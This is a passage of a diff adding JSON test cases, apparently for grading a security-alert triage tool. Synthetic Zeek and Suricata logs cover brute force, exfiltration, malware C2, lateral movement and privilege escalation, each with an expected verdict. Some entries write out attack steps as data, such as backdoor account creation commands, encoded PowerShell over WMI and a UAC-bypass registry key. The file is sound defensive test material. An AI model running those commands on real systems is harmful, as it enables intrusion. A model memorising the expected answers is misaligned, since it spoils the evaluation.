+        "zeek": "1743900000.000000 CHTTP_BF 91.108.4.30 53001 192.168.1.20 443 tcp ssl 0.189 512 256 SF T T 0 ShADadfFr 4 768 3 512\n[... 1000 POST /admin/login attempts with different username:password combinations]\nhttp.log: uri=/admin/login method=POST status_200_count=1 status_401_count=999 attempts=1000 duration=120s\nhttp.log: user_agent=python-requests/2.28.0",
+        "suricata": "[1:2102106:3] ET BRUTE HTTP Login Brute Force [Priority: 1] 2026-04-05T12:00:00 91.108.4.30 -> 192.168.1.20:443\n[1:2102107:2] ET BRUTE Credential Stuffing Pattern Detected [Priority: 1] 2026-04-05T12:01:00 91.108.4.30 -> 192.168.1.20:443\n[1:2102108:1] ET BRUTE Automated Login Tool python-requests [Priority: 2] 2026-04-05T12:02:00 91.108.4.30 -> 192.168.1.20:443"
+      }
+    },
+    {
+      "id": "TC-BF-004",
+      "scenario": "Brute Force",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "SMTP brute force against mail server \u2014 attacker attempting to find valid credentials for spam relay",
+      "input": {
+        "zeek": "1743900000.000000 CSMTP_BF 185.220.101.30 54601 192.168.1.60 25 tcp smtp 0.234 512 128 SF T T 0 ShADadfFr 4 768 2 384\n[... 800 SMTP AUTH attempts with different credentials]\nsmtp.log: auth_attempts=800 auth_success=false src=185.220.101.30 commands=AUTH_LOGIN,AUTH_PLAIN\nsmtp.log: failed_users=['info','admin','support','sales','noreply','postmaster']",
+        "suricata": "[1:2102109:3] ET BRUTE SMTP Auth Brute Force [Priority: 1] 2026-04-05T12:00:00 185.220.101.30 -> 192.168.1.60:25\n[1:2102110:2] ET BRUTE SMTP Multiple AUTH Failures [Priority: 1] 2026-04-05T12:02:00 185.220.101.30 -> 192.168.1.60:25\n[1:2102111:1] ET BRUTE SMTP Brute Force Known Spam IP [Priority: 1] 2026-04-05T12:05:00 185.220.101.30 -> 192.168.1.60:25"
+      }
+    },
+    {
+      "id": "TC-BF-005",
+      "scenario": "Brute Force",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "VPN brute force from Tor exit node \u2014 distributed low-rate attack against VPN gateway, 10 attempts/min",
+      "input": {
+        "zeek": "1743900000.000000 CVPN_BF1 185.220.101.1 4500 192.168.1.1 1194 udp openvpn 0.456 256 128 SF - - 0 Dd 2 312 1 184\n1743900006.000000 CVPN_BF2 185.220.101.2 4501 192.168.1.1 1194 udp openvpn 0.423 256 128 SF - - 0 Dd 2 312 1 184\n[... 10 VPN auth attempts/min from different Tor exit nodes over 15 minutes]\nvpn.log: auth_attempts=150 auth_success=false src_ips=15 all_tor_exit_nodes=true",
+        "suricata": "[1:2102112:2] ET BRUTE VPN Authentication Brute Force [Priority: 2] 2026-04-05T12:00:00 185.220.101.1 -> 192.168.1.1:1194\n[1:2102113:2] ET BRUTE VPN Attack from Tor Exit Node [Priority: 2] 2026-04-05T12:01:00 185.220.101.2 -> 192.168.1.1:1194\n[1:2102114:1] ET BRUTE Distributed VPN Brute Force Pattern [Priority: 2] 2026-04-05T12:05:00 multiple_tor -> 192.168.1.1:1194"
+      }
+    },
+    {
+      "id": "TC-EXFIL-001",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Insider threat \u2014 employee uploading database dump to personal cloud storage before resignation",
+      "input": {
+        "zeek": "1743900000.000000 CINS1 192.168.1.75 54701 52.239.177.99 443 tcp ssl 234.123 104857600 524288 SF T T 0 ShADadfFr 85 104858624 5 525312\nssl.log: server_name=drive.google.com cert_valid=true\nfiles.log: filename=customer_database_full_dump.sql.gz size=104857600 mime=application/gzip tx_hosts=192.168.1.75\nconn.log: 192.168.1.75 upload_bytes_today=1073741824 upload_bytes_30day_avg=10240000 anomaly_ratio=104x",
+        "suricata": "[1:2102200:3] ET POLICY Large File Upload to Cloud Storage [Priority: 2] 2026-04-05T12:00:00 192.168.1.75 -> 52.239.177.99:443\n[1:2102201:2] ET POLICY Database Dump File Upload Detected [Priority: 1] 2026-04-05T12:00:01 192.168.1.75 -> 52.239.177.99:443\n[1:2102202:1] ET POLICY Anomalous Upload Volume Insider Threat Indicator [Priority: 1] 2026-04-05T12:00:10 192.168.1.75 -> 52.239.177.99:443"
+      }
+    },
+    {
+      "id": "TC-EXFIL-002",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Post-compromise exfiltration via HTTPS to attacker-controlled server \u2014 after initial access, attacker staging and sending data",
+      "input": {
+        "zeek": "1743900000.000000 CEXFIL2 192.168.1.110 54801 91.108.56.100 443 tcp ssl 45.234 209715200 1024 SF T T 0 ShADadfFr 170 209716224 5 2048\nssl.log: server_name=cdn-delivery-network.xyz cert_issued=2026-04-04 cert_age_days=1\nfiles.log: filename=archive.tar.gz size=209715200 mime=application/gzip\nconn.log: first_seen_dst=2026-04-04 dst_asn=AS999999_bulletproof",
+        "suricata": "[1:2102203:3] ET MALWARE Post-Compromise Exfiltration to Bulletproof Hosting [Priority: 1] 2026-04-05T12:00:00 192.168.1.110 -> 91.108.56.100:443\n[1:2102204:2] ET POLICY Upload to Newly Registered Domain [Priority: 1] 2026-04-05T12:00:01 192.168.1.110 -> 91.108.56.100:443\n[1:2102205:1] ET MALWARE Known APT Exfiltration Infrastructure [Priority: 1] 2026-04-05T12:00:05 192.168.1.110 -> 91.108.56.100:443"
+      }
+    },
+    {
+      "id": "TC-EXFIL-003",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Email-based exfiltration \u2014 employee forwarding sensitive documents to personal Gmail via SMTP",
+      "input": {
+        "zeek": "1743900000.000000 CMAIL1 192.168.1.90 54901 74.125.140.26 587 tcp smtp 12.345 5242880 1024 SF T T 0 ShADadfFr 25 5243136 5 1280\nsmtp.log: mailfrom=employee@company.com rcptto=personal123@gmail.com subject=Q4_financial_projections\nfiles.log: filename=Q4_Financial_Projections_Confidential.xlsx size=5242880 email_attachment=true\nsmtp.log: mailfrom=employee@company.com rcptto=personal123@gmail.com subject=Customer_PII_Export attachments=customer_data.csv size=10485760",
+        "suricata": "[1:2102206:3] ET POLICY Sensitive Document Email Exfiltration [Priority: 1] 2026-04-05T12:00:00 192.168.1.90 -> 74.125.140.26:587\n[1:2102207:2] ET POLICY Corporate Email to Personal Account [Priority: 2] 2026-04-05T12:00:01 192.168.1.90 -> 74.125.140.26:587\n[1:2102208:1] ET POLICY PII Data Exfiltration via Email [Priority: 1] 2026-04-05T12:00:10 192.168.1.90 -> 74.125.140.26:587"
+      }
+    },
+    {
+      "id": "TC-EXFIL-004",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Steganography-based exfiltration \u2014 data hidden in image files uploaded to social media",
+      "input": {
+        "zeek": "1743900000.000000 CSTEG1 192.168.1.95 55001 157.240.22.35 443 tcp ssl 5.234 10485760 1024 SF T T 0 ShADadfFr 20 10486784 5 2048\nssl.log: server_name=instagram.com\nfiles.log: filename=photo1.jpg size=10485760 mime=image/jpeg entropy=7.98 expected_jpeg_entropy=6.5\nfiles.log: filename=photo2.jpg size=10485760 entropy=7.97\nfiles.log: filename=photo3.jpg size=10485760 entropy=7.99\nconn.log: 192.168.1.95 total_image_uploads=15 avg_entropy=7.98 anomaly=high_entropy_images",
+        "suricata": "[1:2102209:2] ET POLICY High Entropy Image Upload Possible Steganography [Priority: 2] 2026-04-05T12:00:00 192.168.1.95 -> 157.240.22.35:443\n[1:2102210:2] ET POLICY Bulk Image Upload Anomaly [Priority: 2] 2026-04-05T12:00:30 192.168.1.95 -> 157.240.22.35:443\n[1:2102211:1] ET POLICY Suspected Steganographic Exfiltration [Priority: 1] 2026-04-05T12:01:00 192.168.1.95 -> 157.240.22.35:443"
+      }
+    },
+    {
+      "id": "TC-EXFIL-005",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Slow-and-low exfiltration via ICMP \u2014 data encoded in ICMP payload, 1KB/min to avoid detection",
+      "input": {
+        "zeek": "1743900000.000000 CICMP_EX1 192.168.1.80 0 203.0.113.150 0 icmp - 0.001 1024 0 OTH - - 0 - 1 1052 0 0\n1743900060.000000 CICMP_EX2 192.168.1.80 0 203.0.113.150 0 icmp - 0.001 1024 0 OTH - - 0 - 1 1052 0 0\n[... 1 ICMP packet per minute to same external IP for 60 minutes]\nconn.log: 192.168.1.80 icmp_payload_entropy=7.95 icmp_payload_size=1024 expected_icmp_size=64 anomaly=oversized_encrypted_payload",
+        "suricata": "[1:2102212:2] ET POLICY ICMP Oversized Payload Possible Tunneling [Priority: 2] 2026-04-05T12:00:00 192.168.1.80 -> 203.0.113.150\n[1:2102213:2] ET POLICY ICMP Covert Channel High Entropy Payload [Priority: 2] 2026-04-05T12:01:00 192.168.1.80 -> 203.0.113.150\n[1:2102214:1] ET POLICY Slow ICMP Exfiltration Pattern [Priority: 2] 2026-04-05T12:05:00 192.168.1.80 -> 203.0.113.150"
+      }
+    },
+    {
+      "id": "TC-MAL-001",
+      "scenario": "Malware C2 Callback",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Emotet C2 callback \u2014 infected host beaconing to known Emotet infrastructure, downloading second stage",
+      "input": {
+        "zeek": "1743900000.000000 CEmot1 192.168.1.120 55101 45.95.169.100 8080 tcp http 300.123 2048 1048576 SF T T 0 ShADadfFr 10 2304 850 1049600\nhttp.log: method=POST uri=/eFIjkLmnP host=45.95.169.100:8080 user_agent=Mozilla/4.0+(compatible;+MSIE+7.0) resp_body_len=1048576\nfiles.log: filename=update.exe size=1048576 mime=application/x-dosexec md5=a1b2c3d4e5f6789012345678",
+        "suricata": "[1:2029751:3] ET MALWARE Emotet CnC Beacon [Priority: 1] 2026-04-05T12:00:00 192.168.1.120 -> 45.95.169.100:8080\n[1:2029752:2] ET MALWARE Emotet Second Stage Download [Priority: 1] 2026-04-05T12:00:10 192.168.1.120 -> 45.95.169.100:8080\n[1:2029753:1] ET MALWARE Emotet Known C2 IP 45.95.169.100 [Priority: 1] 2026-04-05T12:00:00 192.168.1.120 -> 45.95.169.100:8080"
+      }
+    },
+    {
+      "id": "TC-MAL-002",
+      "scenario": "Malware C2 Callback",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Ransomware C2 \u2014 host communicating with ransomware infrastructure, receiving encryption key, about to encrypt files",
+      "input": {
+        "zeek": "1743900000.000000 CRANS1 192.168.1.130 55201 185.234.218.50 443 tcp ssl 5.234 4096 2048 SF T T 0 ShADadfFr 12 4352 8 2304\nssl.log: server_name=update-service-cdn.net ja3=51c64c77e60f3980eea90869b68c58a8 cert_age_days=2\nhttp.log: method=POST uri=/register body=machine_id=DESKTOP-ABC123&os=Windows11 resp=encryption_key_received\nconn.log: 192.168.1.130 smb_write_rate=500files/sec [mass file encryption starting]",
+        "suricata": "[1:2029800:3] ET MALWARE Ransomware C2 Key Exchange [Priority: 1] 2026-04-05T12:00:00 192.168.1.130 -> 185.234.218.50:443\n[1:2029801:2] ET MALWARE Known Ransomware JA3 Fingerprint [Priority: 1] 2026-04-05T12:00:01 192.168.1.130 -> 185.234.218.50:443\n[1:2029802:1] ET MALWARE Ransomware File Encryption Activity Detected [Priority: 1] 2026-04-05T12:00:10 192.168.1.130 -> internal_smb"
+      }
+    },
+    {
+      "id": "TC-MAL-003",
+      "scenario": "Malware C2 Callback",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "RAT C2 \u2014 Remote Access Trojan receiving commands, attacker performing live interactive session on victim machine",
+      "input": {
+        "zeek": "1743900000.000000 CRAT1 192.168.1.140 55301 91.108.8.200 4444 tcp - 1800.000 524288 10485760 SF T T 0 ShADadfFr 500 524800 10000 10486272\nconn.log: 192.168.1.140 long_lived_conn=true interactive_traffic=true keystroke_timing_pattern=human bytes_ratio=inbound_heavy\nfiles.log: screenshots captured=47 keylog_size=102400 clipboard_data=true",
+        "suricata": "[1:2029900:3] ET MALWARE RAT C2 Interactive Session Detected [Priority: 1] 2026-04-05T12:00:00 192.168.1.140 -> 91.108.8.200:4444\n[1:2029901:2] ET MALWARE Remote Access Trojan Keystroke Exfil [Priority: 1] 2026-04-05T12:15:00 192.168.1.140 -> 91.108.8.200:4444\n[1:2029902:1] ET MALWARE RAT Screenshot Upload Detected [Priority: 1] 2026-04-05T12:20:00 192.168.1.140 -> 91.108.8.200:4444"
+      }
+    },
+    {
+      "id": "TC-MAL-004",
+      "scenario": "Malware C2 Callback",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Banking trojan C2 \u2014 Trickbot variant communicating with C2 to receive web injection configs targeting banking sites",
+      "input": {
+        "zeek": "1743900000.000000 CTRICK1 192.168.1.150 55401 162.255.119.250 447 tcp ssl 120.234 8192 65536 SF T T 0 ShADadfFr 20 8448 55 66560\nssl.log: server_name=analytics-cdn-service.com cert_cn=analytics-cdn-service.com ja3=72a589da586844d7f0818ce684948eea\nhttp.log: method=GET uri=/cfg/injects.bin resp_body=encrypted_webinject_config\nconn.log: 192.168.1.150 browser_process=chrome.exe injected_dll=trickbot.dll",
+        "suricata": "[1:2029950:3] ET MALWARE Trickbot C2 Communication [Priority: 1] 2026-04-05T12:00:00 192.168.1.150 -> 162.255.119.250:447\n[1:2029951:2] ET MALWARE Banking Trojan Web Inject Config Download [Priority: 1] 2026-04-05T12:00:05 192.168.1.150 -> 162.255.119.250:447\n[1:2029952:1] ET MALWARE Trickbot Known C2 JA3 Fingerprint [Priority: 1] 2026-04-05T12:00:01 192.168.1.150 -> 162.255.119.250:447"
+      }
+    },
+    {
+      "id": "TC-MAL-005",
+      "scenario": "Malware C2 Callback",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Cryptominer C2 \u2014 infected host connecting to mining pool, consuming CPU and bandwidth without authorization",
+      "input": {
+        "zeek": "1743900000.000000 CMINE1 192.168.1.160 55501 pool.minexmr.com 3333 tcp - 3600.000 10485760 5242880 SF T T 0 ShADadfFr 10000 10486272 5200 5243392\nconn.log: 192.168.1.160 long_lived=true dst_port=3333 protocol_pattern=stratum_mining cpu_usage=98% process=svchost.exe_injected\ndns.log: query=pool.minexmr.com A rcode=NOERROR",
+        "suricata": "[1:2029975:3] ET MALWARE Cryptocurrency Miner Stratum Protocol [Priority: 1] 2026-04-05T12:00:00 192.168.1.160 -> pool.minexmr.com:3333\n[1:2029976:2] ET MALWARE XMR Mining Pool Connection Detected [Priority: 1] 2026-04-05T12:00:01 192.168.1.160 -> pool.minexmr.com:3333\n[1:2029977:1] ET MALWARE Unauthorized Cryptomining Activity [Priority: 2] 2026-04-05T12:00:05 192.168.1.160 -> pool.minexmr.com:3333"
+      }
+    },
+    {
+      "id": "TC-LAT-001",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Pass-the-Hash attack \u2014 compromised host using NTLM hash to authenticate to multiple internal hosts without credentials",
+      "input": {
+        "zeek": "1743900000.000000 CPTH1 192.168.1.50 49201 192.168.1.10 445 tcp smb 1.234 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\n1743900005.000000 CPTH2 192.168.1.50 49202 192.168.1.20 445 tcp smb 1.198 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\n1743900010.000000 CPTH3 192.168.1.50 49203 192.168.1.30 445 tcp smb 1.221 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\n1743900015.000000 CPTH4 192.168.1.50 49204 192.168.1.40 445 tcp smb 1.209 4096 2048 SF T T 0 ShADadfFr 10 4352 8 2304\nsmb.log: src=192.168.1.50 auth_type=NTLM unique_dst_hosts=4 within=15s admin_share_access=true\nnotice.log: SMB::Lateral_Movement src=192.168.1.50 targets=192.168.1.10,20,30,40",
+        "suricata": "[1:2103001:3] ET EXPLOIT Pass-the-Hash NTLM Lateral Movement [Priority: 1] 2026-04-05T12:00:00 192.168.1.50 -> 192.168.1.10:445\n[1:2103002:2] ET EXPLOIT Rapid SMB Authentication Multiple Hosts [Priority: 1] 2026-04-05T12:00:10 192.168.1.50 -> 192.168.1.0/24\n[1:2103003:1] ET EXPLOIT Lateral Movement Admin Share Access [Priority: 1] 2026-04-05T12:00:15 192.168.1.50 -> 192.168.1.40:445"
+      }
+    },
+    {
+      "id": "TC-LAT-002",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "WMI-based lateral movement \u2014 attacker executing remote commands on multiple hosts via WMI over DCOM port 135",
+      "input": {
+        "zeek": "1743900000.000000 CWMI1 192.168.1.60 50001 192.168.1.11 135 tcp dce_rpc 0.456 2048 1024 SF T T 0 ShADadfFr 8 2304 6 1280\n1743900001.000000 CWMI2 192.168.1.60 50002 192.168.1.12 135 tcp dce_rpc 0.423 2048 1024 SF T T 0 ShADadfFr 8 2304 6 1280\n1743900002.000000 CWMI3 192.168.1.60 50003 192.168.1.13 135 tcp dce_rpc 0.441 2048 1024 SF T T 0 ShADadfFr 8 2304 6 1280\ndce_rpc.log: src=192.168.1.60 endpoint=IWbemServices method=ExecMethod call=Win32_Process.Create cmd=powershell.exe -enc JABj...\nconn.log: 192.168.1.60 wmi_remote_exec=true targets=192.168.1.11,12,13 encoded_payload=true",
+        "suricata": "[1:2103004:3] ET EXPLOIT WMI Remote Execution Lateral Movement [Priority: 1] 2026-04-05T12:00:00 192.168.1.60 -> 192.168.1.11:135\n[1:2103005:2] ET EXPLOIT DCOM WMI Process Creation Remote [Priority: 1] 2026-04-05T12:00:01 192.168.1.60 -> 192.168.1.12:135\n[1:2103006:1] ET EXPLOIT Encoded PowerShell via WMI [Priority: 1] 2026-04-05T12:00:02 192.168.1.60 -> 192.168.1.13:135"
+      }
+    },
+    {
+      "id": "TC-LAT-003",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "RDP lateral movement \u2014 compromised host using valid credentials to RDP into multiple servers sequentially",
+      "input": {
+        "zeek": "1743900000.000000 CRDP_L1 192.168.1.70 50101 192.168.1.100 3389 tcp rdp 3600.000 524288 1048576 SF T T 0 ShADadfFr 500 524800 1000 1049088\n1743903600.000000 CRDP_L2 192.168.1.70 50102 192.168.1.101 3389 tcp rdp 3598.234 524100 1048200 SF T T 0 ShADadfFr 498 524600 998 1048704\n1743907200.000000 CRDP_L3 192.168.1.70 50103 192.168.1.102 3389 tcp rdp 3599.123 524200 1048300 SF T T 0 ShADadfFr 499 524700 999 1048832\nrdp.log: src=192.168.1.70 auth_success=true user=domain_admin sequential_targets=3 within=3h",
+        "suricata": "[1:2103007:2] ET EXPLOIT RDP Lateral Movement Sequential Hosts [Priority: 1] 2026-04-05T12:00:00 192.168.1.70 -> 192.168.1.100:3389\n[1:2103008:2] ET POLICY RDP Admin Login Unusual Source [Priority: 2] 2026-04-05T13:00:00 192.168.1.70 -> 192.168.1.101:3389\n[1:2103009:1] ET EXPLOIT Hopping RDP Session Pattern [Priority: 2] 2026-04-05T14:00:00 192.168.1.70 -> 192.168.1.102:3389"
+      }
+    },
+    {
+      "id": "TC-LAT-004",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "PsExec-based lateral movement \u2014 attacker deploying executables remotely via SMB ADMIN$ share across network",
+      "input": {
+        "zeek": "1743900000.000000 CPsEx1 192.168.1.80 50201 192.168.1.15 445 tcp smb 2.341 65536 32768 SF T T 0 ShADadfFr 20 65792 15 33024\n1743900003.000000 CPsEx2 192.168.1.80 50202 192.168.1.16 445 tcp smb 2.298 65536 32768 SF T T 0 ShADadfFr 20 65792 15 33024\nsmb.log: src=192.168.1.80 share=ADMIN$ file_written=PSEXESVC.exe dst=192.168.1.15\nsmb.log: src=192.168.1.80 share=ADMIN$ file_written=PSEXESVC.exe dst=192.168.1.16\nconn.log: 192.168.1.80 -> 192.168.1.15:445 psexec_pattern=true service_install=PSEXESVC",
+        "suricata": "[1:2103010:3] ET EXPLOIT PsExec Remote Service Installation [Priority: 1] 2026-04-05T12:00:00 192.168.1.80 -> 192.168.1.15:445\n[1:2103011:2] ET EXPLOIT PSEXESVC Binary Deployment via SMB [Priority: 1] 2026-04-05T12:00:03 192.168.1.80 -> 192.168.1.16:445\n[1:2103012:1] ET EXPLOIT Lateral Movement Tool PsExec Confirmed [Priority: 1] 2026-04-05T12:00:05 192.168.1.80 -> 192.168.1.15:445"
+      }
+    },
+    {
+      "id": "TC-LAT-005",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "SSH key-based lateral movement \u2014 attacker using stolen SSH private key to hop between Linux servers",
+      "input": {
+        "zeek": "1743900000.000000 CSSHHop1 192.168.1.90 50301 192.168.1.200 22 tcp ssh 120.234 65536 32768 SF T T 0 ShADadfFr 60 65792 30 33024\n1743900125.000000 CSSHHop2 192.168.1.200 50302 192.168.1.201 22 tcp ssh 118.456 65100 32500 SF T T 0 ShADadfFr 58 65356 29 32756\n1743900248.000000 CSSHHop3 192.168.1.201 50303 192.168.1.202 22 tcp ssh 119.789 65200 32600 SF T T 0 ShADadfFr 59 65456 28 32856\nssh.log: chain 192.168.1.90->192.168.1.200->192.168.1.201->192.168.1.202 auth_type=publickey key_fingerprint=SHA256:abcd1234 same_key_all_hops=true",
+        "suricata": "[1:2103013:2] ET EXPLOIT SSH Key Reuse Lateral Hop Chain [Priority: 1] 2026-04-05T12:00:00 192.168.1.90 -> 192.168.1.200:22\n[1:2103014:2] ET EXPLOIT SSH Lateral Movement Sequential Hop [Priority: 2] 2026-04-05T12:02:05 192.168.1.200 -> 192.168.1.201:22\n[1:2103015:1] ET EXPLOIT SSH Pivoting Chain Detected [Priority: 2] 2026-04-05T12:04:08 192.168.1.201 -> 192.168.1.202:22"
+      }
+    },
+    {
+      "id": "TC-LAT-006",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "LLMNR/NBT-NS poisoning \u2014 attacker responding to broadcast name resolution to capture NTLM hashes",
+      "input": {
+        "zeek": "1743900000.000000 CLLMNR1 192.168.1.55 5355 224.0.0.252 5355 udp llmnr 0.012 64 128 SF - - 0 Dd 1 92 1 156\n1743900000.100000 CLLMNR2 192.168.1.55 5355 224.0.0.252 5355 udp llmnr 0.011 64 128 SF - - 0 Dd 1 92 1 156\n[... 200 LLMNR responses within 60s all from 192.168.1.55]\nsmb.log: src=192.168.1.100 dst=192.168.1.55 auth_type=NTLM ntlm_hash_captured=true user=DOMAIN\\jsmith",
+        "suricata": "[1:2103016:2] ET EXPLOIT LLMNR Poisoning Attack Detected [Priority: 2] 2026-04-05T12:00:00 192.168.1.55 -> 224.0.0.252\n[1:2103017:2] ET EXPLOIT NBT-NS Poisoning Responder Tool [Priority: 2] 2026-04-05T12:00:10 192.168.1.55 -> 192.168.1.255\n[1:2103018:1] ET EXPLOIT NTLM Hash Capture via Poisoning [Priority: 2] 2026-04-05T12:00:30 192.168.1.100 -> 192.168.1.55:445"
+      }
+    },
+    {
+      "id": "TC-LAT-007",
+      "scenario": "Lateral Movement",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Kerberoasting \u2014 attacker requesting service tickets for all SPNs to crack offline, high volume TGS requests",
+      "input": {
+        "zeek": "1743900000.000000 CKerb1 192.168.1.65 50401 192.168.1.1 88 tcp kerberos 0.089 512 4096 SF T T 0 ShADadfFr 4 768 12 4352\n1743900000.500000 CKerb2 192.168.1.65 50402 192.168.1.1 88 tcp kerberos 0.091 512 4096 SF T T 0 ShADadfFr 4 768 12 4352\n[... 50 TGS-REQ for different SPNs within 30 seconds]\nkerberos.log: src=192.168.1.65 tgs_requests=50 unique_spns=50 encryption_type=RC4-HMAC within=30s pattern=kerberoasting",
+        "suricata": "[1:2103019:3] ET EXPLOIT Kerberoasting Attack Detected [Priority: 1] 2026-04-05T12:00:00 192.168.1.65 -> 192.168.1.1:88\n[1:2103020:2] ET EXPLOIT Mass TGS Request Multiple SPNs [Priority: 1] 2026-04-05T12:00:15 192.168.1.65 -> 192.168.1.1:88\n[1:2103021:1] ET EXPLOIT RC4 Downgrade Kerberos Ticket Harvesting [Priority: 1] 2026-04-05T12:00:30 192.168.1.65 -> 192.168.1.1:88"
+      }
+    },
+    {
+      "id": "TC-PRIV-001",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Local privilege escalation via kernel exploit \u2014 unprivileged process spawning root shell confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CPriv1 192.168.1.110 50501 192.168.1.110 0 tcp - 0.001 4096 0 OTH - - 0 - 1 4124 0 0\nconn.log: 192.168.1.110 local_exploit=true process=apache2 spawned_process=bash uid_before=33 uid_after=0 exploit=CVE-2022-0847_dirty_pipe\nhttp.log: POST /upload.php body=exploit.elf size=45056 status=200",
+        "suricata": "[1:2103022:3] ET EXPLOIT Linux Kernel Privilege Escalation DirtyPipe [Priority: 1] 2026-04-05T12:00:00 192.168.1.110\n[1:2103023:2] ET EXPLOIT Web Process Spawning Root Shell [Priority: 1] 2026-04-05T12:00:01 192.168.1.110\n[1:2103024:1] ET EXPLOIT UID 0 Process from Web Service Confirmed [Priority: 1] 2026-04-05T12:00:02 192.168.1.110"
+      }
+    },
+    {
+      "id": "TC-PRIV-002",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Token impersonation via PrintSpoofer \u2014 Windows service account escalating to SYSTEM via spooler exploit",
+      "input": {
+        "zeek": "1743900000.000000 CWinPriv1 192.168.1.120 50601 192.168.1.120 445 tcp smb 0.234 2048 1024 SF T T 0 ShADadfFr 8 2304 6 1280\nsmb.log: src=192.168.1.120 pipe=spoolss operation=RpcOpenPrinter exploit_pattern=printspoofer\nconn.log: 192.168.1.120 process=iis_apppool spawned_process=cmd.exe token_impersonation=SYSTEM printspoofer=true",
+        "suricata": "[1:2103025:3] ET EXPLOIT PrintSpoofer Token Impersonation [Priority: 1] 2026-04-05T12:00:00 192.168.1.120\n[1:2103026:2] ET EXPLOIT Windows Print Spooler Privilege Escalation [Priority: 1] 2026-04-05T12:00:00 192.168.1.120 -> 192.168.1.120:445\n[1:2103027:1] ET EXPLOIT SYSTEM Shell via Service Account Confirmed [Priority: 1] 2026-04-05T12:00:01 192.168.1.120"
+      }
+    },
+    {
+      "id": "TC-PRIV-003",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Sudo misconfiguration abuse \u2014 user running sudo with NOPASSWD to gain root via allowed binary",
+      "input": {
+        "zeek": "1743900000.000000 CSudo1 192.168.1.130 50701 192.168.1.250 22 tcp ssh 45.234 8192 16384 SF T T 0 ShADadfFr 20 8448 35 16640\nssh.log: src=192.168.1.130 user=www-data dst=192.168.1.250 commands_executed=['sudo vim /etc/passwd','sudo bash'] uid_escalation=0\nconn.log: 192.168.1.130 -> 192.168.1.250 post_escalation_cmds=['adduser hacker','usermod -aG sudo hacker']",
+        "suricata": "[1:2103028:2] ET EXPLOIT Sudo Privilege Escalation Detected [Priority: 1] 2026-04-05T12:00:00 192.168.1.130 -> 192.168.1.250:22\n[1:2103029:2] ET EXPLOIT Backdoor Account Creation Post Escalation [Priority: 1] 2026-04-05T12:00:30 192.168.1.130 -> 192.168.1.250:22\n[1:2103030:1] ET EXPLOIT New Admin User Added via SSH [Priority: 1] 2026-04-05T12:00:45 192.168.1.130 -> 192.168.1.250:22"
+      }
+    },
+    {
+      "id": "TC-PRIV-004",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "DCSync attack \u2014 attacker with domain user account replicating all password hashes from Domain Controller",
+      "input": {
+        "zeek": "1743900000.000000 CDCSync 192.168.1.140 50801 192.168.1.1 389 tcp ldap 5.234 65536 524288 SF T T 0 ShADadfFr 25 65792 200 524544\nldap.log: src=192.168.1.140 operation=searchRequest filter=(objectClass=user) attrs=unicodePwd,ntPwdHistory scope=subtree\ndce_rpc.log: src=192.168.1.140 endpoint=drsuapi method=DsGetNCChanges replication_all_objects=true\nconn.log: 192.168.1.140 dcsync=true hashes_extracted=estimated_all_domain_accounts",
+        "suricata": "[1:2103031:3] ET EXPLOIT DCSync Attack Domain Replication [Priority: 1] 2026-04-05T12:00:00 192.168.1.140 -> 192.168.1.1:389\n[1:2103032:2] ET EXPLOIT DsGetNCChanges Non-DC Replication Request [Priority: 1] 2026-04-05T12:00:01 192.168.1.140 -> 192.168.1.1:445\n[1:2103033:1] ET EXPLOIT Domain Password Hash Dump Confirmed [Priority: 1] 2026-04-05T12:00:05 192.168.1.140 -> 192.168.1.1:389"
+      }
+    },
+    {
+      "id": "TC-PRIV-005",
+      "scenario": "Privilege Escalation",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "UAC bypass via registry hijacking \u2014 attacker silently elevating to admin without UAC prompt on Windows",
+      "input": {
+        "zeek": "1743900000.000000 CUAC1 192.168.1.150 50901 192.168.1.150 0 tcp - 0.001 1024 0 OTH - - 0 - 1 1052 0 0\nconn.log: 192.168.1.150 uac_bypass=true method=registry_hijack key=HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command value=cmd.exe process_before=user_level process_after=elevated_admin\nhttp.log: GET /payload.dll src=192.168.1.150 dst=203.0.113.50 status=200 size=102400",
